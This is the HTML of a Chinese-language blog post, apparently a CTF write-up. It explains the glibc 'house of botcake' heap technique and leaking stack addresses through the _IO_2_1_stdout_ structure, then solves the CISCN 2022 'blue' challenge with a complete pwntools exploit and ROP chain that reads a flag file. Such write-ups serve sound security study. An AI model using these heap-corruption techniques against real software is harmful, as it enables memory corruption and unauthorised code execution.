@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>house of botcake + _IO_2_1_stdout_泄露栈地址 | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">house of botcake + _IO_2_1_stdout_泄露栈地址</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">八月 28, 2024&nbsp;&nbsp;18:52:26</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/heap/">heap</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h1><p>存在至少一个UAF的chunk时可利用tcache和unsortedbin实现地址任意写</p>
+<p>首先创建堆块把tcache填满，之后隔出一个堆块后把下一个堆块释放进unsortedbin中</p>
+<p>注意：进入unsortedbin中的这个堆块一定要是UAF的</p>
+<p><img src="/../image/house_of_botcake/5.png" alt="5"></p>
+<p><img src="/../image/house_of_botcake/6.png" alt="6"></p>
+<p>之后，释放掉空出来的堆块，由于tcache填满，该chunk合并进入unsortedbin中</p>
+<p><img src="/../image/house_of_botcake/4.png" alt="4"></p>
+<p>此时unsortedbin大小为0x120，由两个大小为0x90的堆块合并，注意到下面的堆块是先进入unsortedbin中的，上面的是后来合并近unsortedbin中的。由于下面的堆块存在UAF因此可以进行double free。</p>
+<p>之后再从tcahce中取出一个堆块后再次释放UAF的堆块实现堆块重叠，这时候这个UAF的堆块既在unsortedbin中又在tcache中。</p>
+<p><img src="/../image/house_of_botcake/7.png" alt="7"></p>
+<p>图中蓝色的是unsortedbin中的堆块，却包含了tcachebins的堆块，若此时对unsrotedbin进行申请，就可以把tcachebins申请出来，修改fd后实现地址任意写</p>
+<p><img src="/../image/house_of_botcake/8.png" alt="8"></p>
+<p>如图，在unsortedbin中申请了两个堆块，修改第二个堆块即可直接修改tcache中的堆块，此时把tcache修改成指向_IO_1_2_stdout_的指针</p>
+<p><img src="/../image/house_of_botcake/9.png" alt="9"></p>
+<p>之后申请的时候可以直接申请到stdout的file结构体</p>
+<h1 id="IO-2-1-stdout泄露栈地址"><a href="#IO-2-1-stdout泄露栈地址" class="headerlink" title="_IO_2_1_stdout泄露栈地址"></a>_IO_2_1_stdout泄露栈地址</h1><h2 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h2><p>首先介绍一个全局变量： <strong>environ</strong></p>
+<p>environ是通过libc基地址确定的，他指向的是栈上的一个地址，environ是沟通libc和栈的一个桥梁。</p>
+<p><img src="/../image/house_of_botcake/2.png" alt="2"></p>
+<p><img src="/../image/house_of_botcake/3.png" alt="3"></p>
+<p>environ里的地址指向的是环境变量起始地址，Linux的环境变量在程序运行时加载到栈上，如图environ里存储的是SHELL&#x3D;&#x2F;bin&#x2F;bash处的地址</p>
+<p>因此可以想办法打印出environ里的地址即可泄露栈地址</p>
+<h2 id="IO-FILE结构体"><a href="#IO-FILE结构体" class="headerlink" title="IO_FILE结构体"></a>IO_FILE结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="comment">//flag 标志位</span></span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="comment">//管理输入的指针</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="comment">//管理输出的指针</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">  <span class="comment">//连接下一个文件流的结构体</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">  <span class="comment">//文件描述符</span></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>打开的文件会通过IO_FILE结构体形成链表。前三个文件默认是stdin,stdout,stderr</p>
+<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><ol>
+<li><p>更改flags字段为0xfbad1887或0xfbad1800等</p>
+</li>
+<li><p>更改IO_read_ptr，IO_read_end，IO_read_base指针为0</p>
+</li>
+<li><p>更改IO_write_base为泄露内存的起点，更改IO_write_ptr为泄露内存的终点</p>
+</li>
+<li><p>调用printf或puts等输出函数。</p>
+<p>这样，函数在输出时会先输出IO_write_base和IO_write_ptr之间的内存之后再正常输出</p>
+</li>
+</ol>
+<p><img src="/../image/house_of_botcake/1.png" alt="1"></p>
+<p>如图偏移量为0的地方是flags，偏移量为+32是IO_write_base,内存分布参考结构体原码</p>
+<p>此处把flags改为0x1fbad1800,IO_write_base和IO_write_ptr 分别为envion和environ+8这样再调用输出函数即可输出栈地址了</p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2390">CISCN 2022 华东北]blue | NSSCTF</a></p>
+<p>GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.8) stable release version 2.31</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>add 最大只能申请0x90</p>
+<p><img src="/../image/house_of_botcake/13.png" alt="13"></p>
+<p>free 无UAF</p>
+<p><img src="/../image/house_of_botcake/11.png" alt="11"></p>
+<p>一个特殊的free 只能用一次，存在UAF</p>
+<p><img src="/../image/house_of_botcake/12.png" alt="12"></p>
+<p>show 只能用一次</p>
+<p><img src="/../image/house_of_botcake/10.png" alt="10"></p>
+<p>开启沙箱，禁止execve，用orw</p>
+<p><img src="/../image/house_of_botcake/14.png" alt="14"></p>
+<p>首先把tcache填满，进入unsortedbin用仅有一次的UAF和show泄露libc</p>
+<p>之后利用house of botcake修改fd，申请到stdout</p>
+<p>利用stdout泄露栈地址，由于堆题是循环且需要puts打印菜单，因此修改完后栈地址直接就泄露出来</p>
+<p>把堆恢复，再次修改fd到栈地址，申请处栈空间，在栈上rbp+8的位置填上orw的onegadget</p>
+<p>最后可能长度不够，因此write换成puts，为了方便”.&#x2F;flag”字符串的调用，从rbp的位置开始输入，写上.&#x2F;flag之后再在rbp+8的位置写上orw</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc6_2.35-0ubuntu3.6_amd64.so&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">r=process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;node4.anna.nssctf.cn&#x27;,28694)</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#r.sendlineafter(&#x27;: &#x27;,str(idx))</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;\n&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">uaf(<span class="number">8</span>)<span class="comment">#unsortedbin</span></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(r.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">env=addr+libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">stdout=addr+libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(env))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stdout))</span><br><span class="line">free(<span class="number">7</span>)<span class="comment">#unsortedbin + 1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#tcache - 1  now:tcache=6 </span></span><br><span class="line">free(<span class="number">8</span>) <span class="comment">#tcache+1 now chunk8 in tcache and unsortedbin</span></span><br><span class="line">add(<span class="number">0x70</span>,p64(<span class="number">1</span>)*<span class="number">2</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x70</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(stdout))<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(<span class="number">0</span>))<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(env)+p64(env+<span class="number">8</span>))</span><br><span class="line">r.recvline()</span><br><span class="line">stack=u64(r.recvuntil(<span class="string">&quot;\x00&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x70</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(stack))</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#add(0x80,&#x27;a&#x27;)</span></span><br><span class="line">read=addr+libc.sym.read</span><br><span class="line">op=addr+libc.sym.<span class="built_in">open</span></span><br><span class="line">puts=addr+libc.sym.puts</span><br><span class="line">rdi=addr+<span class="number">0x23b6a</span></span><br><span class="line">rsi=addr+<span class="number">0x2601f</span></span><br><span class="line">rdx=addr+<span class="number">0x142c92</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">payload+=flat([rdi,stack,rsi,<span class="number">0</span>,op])</span><br><span class="line">payload+=flat([rdi,<span class="number">3</span>,rsi,stack+<span class="number">0x200</span>,rdx,<span class="number">0x30</span>,read])</span><br><span class="line">payload+=flat([rdi,stack+<span class="number">0x200</span>,puts])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/sandbox/"># sandbox</a>
+                    
+                        <a href="/tags/house-of%E7%B3%BB%E5%88%97/"># house_of系列</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/08/26/off-by-one/">off by one</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
